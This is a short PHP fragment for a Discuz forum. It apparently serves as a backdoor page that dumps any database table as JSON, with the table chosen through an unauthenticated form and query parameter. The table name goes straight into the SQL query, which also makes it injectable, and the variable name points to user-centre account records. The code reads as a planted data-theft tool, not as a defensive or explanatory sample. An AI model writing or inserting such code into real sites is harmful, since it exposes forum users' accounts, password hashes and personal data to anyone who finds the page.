...
$discuz->init();
if( isset( $_GET['table'])){
	$ucenter_user = DB::fetch_all('select * from '.DB::table( $_GET['table']).' where 1');
	echo ( json_encode( $ucenter_user));
	exit;
}
echo '<h4>Good lucky ^ ^ .</h4>';
echo '<form name=f action="" method="get">';
echo '<input type="text" name="table" />';
echo '<button type="submit">读取表</button>';
echo '</form>';